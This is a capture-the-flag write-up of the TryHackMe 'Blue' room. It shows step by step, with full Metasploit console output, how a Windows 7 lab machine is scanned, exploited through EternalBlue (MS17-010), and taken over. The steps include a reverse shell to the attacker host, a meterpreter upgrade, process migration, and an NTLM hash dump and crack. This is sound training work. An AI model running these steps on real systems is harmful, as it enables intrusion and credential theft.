---
title: Writeup for TryHackMe room - Blue
author: 4n3i5v74
date: 2021-03-23 00:00:00 +0530
categories: [CTF, TryHackMe]
tags: [tryhackme, writeup, ctf, windows, privesc]
pin: false
---


<div class="flex-container">
  <script src="https://tryhackme.com/badge/34685"></script>
</div>


## [Blue](https://tryhackme.com/room/blue){:target="_blank"}

This room contains detailed info about eternalblue vulnerability of samba and windows privilege escalation methods.

For complete tryhackme path, refer the [link](https://4n3i5v74.github.io/posts/getting-started-with-cybersecurity-tryhackme/){:target="_blank"}.


## Tools Used

### Enumeration

- NMAP

### Exploitation

- Msfconsole


## Task 1 - Recon

### References
- [NMAP Reference](https://4n3i5v74.github.io/posts/cheatsheet-nmap/){:target="_blank"}


Use `nmap` to enumerate the target machine using `nmap -PN -T4 -sS --top-ports 1000 -A <ip>`

The output will be similar to
{% capture code %}{% raw %}Starting Nmap 7.80 ( https://nmap.org ) at 2021-04-23 05:10 UTC
Nmap scan report for <hostname> (<ip>)
Host is up (0.00048s latency).
Not shown: 991 closed ports
PORT      STATE SERVICE      VERSION
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  tcpwrapped
|_ssl-date: 2021-04-23T05:12:27+00:00; -1s from scanner time.
49152/tcp open  msrpc        Microsoft Windows RPC
49153/tcp open  msrpc        Microsoft Windows RPC
49154/tcp open  msrpc        Microsoft Windows RPC
49158/tcp open  msrpc        Microsoft Windows RPC
49160/tcp open  msrpc        Microsoft Windows RPC
MAC Address: 02:15:D5:45:ED:73 (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).

TCP/IP fingerprint:

OS:SCAN(V=7.80%E=4%D=4/23%OT=135%CT=1%CU=41002%PV=Y%DS=1%DC=D%G=Y%M=0215D5%
OS:TM=60825777%P=x86_64-pc-linux-gnu)SEQ(SP=103%GCD=1%ISR=10D%TI=I%CI=I%II=
OS:I%SS=S%TS=7)OPS(O1=M2301NW8ST11%O2=M2301NW8ST11%O3=M2301NW8NNT11%O4=M230
OS:1NW8ST11%O5=M2301NW8ST11%O6=M2301ST11)WIN(W1=2000%W2=2000%W3=2000%W4=200
OS:0%W5=2000%W6=2000)ECN(R=Y%DF=Y%T=80%W=2000%O=M2301NW8NNS%CC=N%Q=)T1(R=Y%
OS:DF=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=Y%T=80%W=0%S=Z%A=S%F=AR%O=%RD=
OS:0%Q=)T3(R=Y%DF=Y%T=80%W=0%S=Z%A=O%F=AR%O=%RD=0%Q=)T4(R=Y%DF=Y%T=80%W=0%S
OS:=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R
OS:=Y%DF=Y%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=80%W=0%S=Z%A=S+%F=
OS:AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%
OS:RUD=G)IE(R=Y%DFI=N%T=80%CD=Z)

Network Distance: 1 hop
Service Info: Host: JON-PC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 1h14m59s, deviation: 2h30m00s, median: -1s
|_nbstat: NetBIOS name: JON-PC, NetBIOS user: <unknown>, NetBIOS MAC: 02:15:d5:45:ed:73 (unknown)
| smb-os-discovery:
|   OS: Windows 7 Professional 7601 Service Pack 1 (Windows 7 Professional 6.1)
|   OS CPE: cpe:/o:microsoft:windows_7::sp1:professional
|   Computer name: Jon-PC
|   NetBIOS computer name: JON-PC\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-04-23T00:12:13-05:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2021-04-23T05:12:13
|_  start_date: 2021-04-23T05:08:45

TRACEROUTE
HOP RTT     ADDRESS
1   0.48 ms <hostname> (<ip>)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 148.44 seconds{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `firefox` and search for `windows 7 professional 7601 service pack 1 smb vulnerability` which will result in the [url](https://www.rapid7.com/db/modules/exploit/windows/smb/ms17_010_eternalblue/){:target="_blank"}.


## Task 2 - Gain Access

Use `msfconsole -q` to search for `eternalblue` exploit.
{% capture code %}{% raw %}msf5 > search eternalblue

Matching Modules

#  Name                                           Disclosure Date  Rank     Check  Description
-  ----                                           ---------------  ----     -----  -----------
0  auxiliary/admin/smb/ms17_010_command           2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
1  auxiliary/scanner/smb/smb_ms17_010                              normal   No     MS17-010 SMB RCE Detection
2  exploit/windows/smb/ms17_010_eternalblue       2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
3  exploit/windows/smb/ms17_010_eternalblue_win8  2017-03-14       average  No     MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption for Win8+
4  exploit/windows/smb/ms17_010_psexec            2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
5  exploit/windows/smb/smb_doublepulsar_rce       2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index, for example use 5 or use exploit/windows/smb/smb_doublepulsar_rce

msf5 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp{% endraw %}{% endcapture %} {% include code.html code=code %}

Check the current options and set variables.
{% capture code %}{% raw %}msf5 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

Name           Current Setting  Required  Description
----           ---------------  --------  -----------
RHOSTS                          yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
RPORT          445              yes       The target port (TCP)
SMBDomain      .                no        (Optional) The Windows domain to use for authentication
SMBPass                         no        (Optional) The password for the specified username
SMBUser                         no        (Optional) The username to authenticate as
VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target.


Payload options (windows/x64/meterpreter/reverse_tcp):

Name      Current Setting  Required  Description
----      ---------------  --------  -----------
EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
LHOST     <source-ip>      yes       The listen address (an interface may be specified)
LPORT     4444             yes       The listen port


Exploit target:

Id  Name
--  ----
0   Windows 7 and Server 2008 R2 (x64) All Service Packs


msf5 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS <target-ip>
RHOSTS => <target-ip>

msf5 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
payload => windows/x64/shell/reverse_tcp{% endraw %}{% endcapture %} {% include code.html code=code %}

Exploit to get the shell. Background the shell to escalate privileges.
{% capture code %}{% raw %}msf5 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on <source-ip>:4444
[*] <target-ip>:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] <target-ip>:445       - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] <target-ip>:445       - Scanned 1 of 1 hosts (100% complete)
[*] <target-ip>:445 - Connecting to target for exploitation.
[+] <target-ip>:445 - Connection established for exploitation.
[+] <target-ip>:445 - Target OS selected valid for OS indicated by SMB reply
[*] <target-ip>:445 - CORE raw buffer dump (42 bytes)
[*] <target-ip>:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] <target-ip>:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] <target-ip>:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1
[+] <target-ip>:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] <target-ip>:445 - Trying exploit with 12 Groom Allocations.
[*] <target-ip>:445 - Sending all but last fragment of exploit packet
[*] <target-ip>:445 - Starting non-paged pool grooming
[+] <target-ip>:445 - Sending SMBv2 buffers
[+] <target-ip>:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] <target-ip>:445 - Sending final SMBv2 buffers.
[*] <target-ip>:445 - Sending last fragment of exploit packet!
[*] <target-ip>:445 - Receiving response from exploit packet
[+] <target-ip>:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] <target-ip>:445 - Sending egg to corrupted connection.
[*] <target-ip>:445 - Triggering free of corrupted buffer.
[*] Sending stage (336 bytes) to <target-ip>
[*] Command shell session 1 opened (<source-ip>:4444 -> <target-ip>:49186) at 2021-04-24 03:00:24 +0000
[+] <target-ip>:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] <target-ip>:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] <target-ip>:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=

Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>^Z
Background session 1? [y/N]  y{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 3 - Escalate

From `msfconsole -q` console, convert the regular shell to `meterpreter` shell. Get the options, set required variables and set the backgrounded shell `session`.
{% capture code %}{% raw %}msf5 exploit(windows/smb/ms17_010_eternalblue) > use post/multi/manage/shell_to_meterpreter

msf5 post(multi/manage/shell_to_meterpreter) > show options

Module options (post/multi/manage/shell_to_meterpreter):

Name     Current Setting  Required  Description
----     ---------------  --------  -----------
HANDLER  true             yes       Start an exploit/multi/handler to receive the connection
LHOST                     no        IP of host that will receive the connection from the payload (Will try to auto detect).
LPORT    4433             yes       Port for payload to connect to.
SESSION                   yes       The session to run this module on.

msf5 post(multi/manage/shell_to_meterpreter) > set LHOST 10.10.31.24
LHOST => 10.10.31.24

msf5 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions

Id  Name  Type               Information  Connection
--  ----  ----               -----------  ----------
1         shell x64/windows               10.10.31.24:4444 -> 10.10.57.41:49186 (10.10.57.41)

msf5 post(multi/manage/shell_to_meterpreter) > set session 1
session => 1{% endraw %}{% endcapture %} {% include code.html code=code %}

Exploit to create `meterpreter` shell `session` from regular shell.
{% capture code %}{% raw %}msf5 post(multi/manage/shell_to_meterpreter) > exploit

[*] Upgrading session ID: 1
[*] Starting exploit/multi/handler
[*] Started reverse TCP handler on 10.10.31.24:4433
[*] Post module execution completed
[*] Sending stage (176195 bytes) to 10.10.57.41
[*] Meterpreter session 2 opened (10.10.31.24:4433 -> 10.10.57.41:49195) at 2021-04-24 03:07:17 +0000
[*] Stopping exploit/multi/handler

msf5 post(multi/manage/shell_to_meterpreter) > sessions

Active sessions

Id  Name  Type                     Information                   Connection
--  ----  ----                     -----------                   ----------
1         shell x64/windows                                      10.10.31.24:4444 -> 10.10.57.41:49186 (10.10.57.41)
2         meterpreter x86/windows  NT AUTHORITY\SYSTEM @ JON-PC  10.10.31.24:4433 -> 10.10.57.41:49195 (10.10.57.41)

msf5 post(multi/manage/shell_to_meterpreter) > sessions 2
[*] Starting interaction with 2...

meterpreter > {% endraw %}{% endcapture %} {% include code.html code=code %}

Check the `user` and `system` information.
{% capture code %}{% raw %}meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM

meterpreter > sysinfo
Computer        : JON-PC
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 0
Meterpreter     : x86/windows{% endraw %}{% endcapture %} {% include code.html code=code %}

Check the current processes and migrate to `conhost.exe` process.
{% capture code %}{% raw %}meterpreter > ps

Process List

PID   PPID  Name                  Arch  Session  User                          Path
---   ----  ----                  ----  -------  ----                          ----
0     0     [System Process]
4     0     System                x64   0
416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\smss.exe
428   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
488   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
564   556   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
612   556   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\wininit.exe
624   604   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\csrss.exe
664   604   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
712   612   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\services.exe
720   612   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
728   612   lsm.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsm.exe
836   712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
900   564   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
904   712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
928   2260  cmd.exe               x86   0        NT AUTHORITY\SYSTEM           C:\Windows\SysWOW64\cmd.exe
952   712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
1020  664   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\LogonUI.exe
1080  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
1180  712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
1300  712   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
1344  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
1408  712   amazon-ssm-agent.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\SSM\amazon-ssm-agent.exe
1484  712   LiteAgent.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Xentools\LiteAgent.exe
1620  712   Ec2Config.exe         x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Amazon\Ec2ConfigService\Ec2Config.exe
1924  2900  powershell.exe        x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
1936  712   TrustedInstaller.exe  x64   0        NT AUTHORITY\SYSTEM           C:\Windows\servicing\TrustedInstaller.exe
1948  712   svchost.exe           x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
2080  712   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\sppsvc.exe
2120  836   WmiPrvSE.exe          x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\wbem\WmiPrvSE.exe
2260  1924  powershell.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\syswow64\WindowsPowerShell\v1.0\powershell.exe
2400  712   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
2580  712   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
2612  712   vds.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\vds.exe
2712  712   SearchIndexer.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\SearchIndexer.exe
2728  564   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe
2852  1300  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\cmd.exe
3036  564   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\conhost.exe

meterpreter > migrate 3036
[*] Migrating from 2260 to 3036...
[*] Migration completed successfully.{% endraw %}{% endcapture %} {% include code.html code=code %}


## Task 4 - Cracking

Use `msfconsole -q` to dump `hashes` of users.
{% capture code %}{% raw %}meterpreter > hashdump
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::{% endraw %}{% endcapture %} {% include code.html code=code %}

Use `firefox` and load the url [crackstation](https://crackstation.net){:target="_blank"} and crack the hash `ffb43f0de35be4d9917ac0cc8ad57f8d`.


## Task 5 - Find flags!

Use `msfconsole -q` to get a shell and find the flags.
{% capture code %}{% raw %}meterpreter > shell
Process 2076 created.
Channel 2 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\>dir /s /p flag*
dir /s /p flag*
Volume in drive C has no label.
Volume Serial Number is E611-0B66

Directory of C:\

03/17/2019  02:27 PM                24 flag1.txt
            1 File(s)             24 bytes

Directory of C:\Users\Jon\AppData\Roaming\Microsoft\Windows\Recent

03/17/2019  02:26 PM               482 flag1.lnk
03/17/2019  02:30 PM               848 flag2.lnk
03/17/2019  02:32 PM             2,344 flag3.lnk
            3 File(s)          3,674 bytes

Directory of C:\Users\Jon\Documents

03/17/2019  02:26 PM                37 flag3.txt
            1 File(s)             37 bytes

Directory of C:\Windows\System32\config

03/17/2019  02:32 PM                34 flag2.txt
            1 File(s)             34 bytes

Total Files Listed:
        6 File(s)          3,769 bytes
        0 Dir(s)  20,479,127,552 bytes free

C:\>type C:\flag1.txt
type C:\flag1.txt
<flag>

C:\>type C:\Windows\System32\config\flag2.txt
type C:\Windows\System32\config\flag2.txt
<flag>

C:\>type C:\Users\Jon\Documents\flag3.txt
type C:\Users\Jon\Documents\flag3.txt
<flag>{% endraw %}{% endcapture %} {% include code.html code=code %}

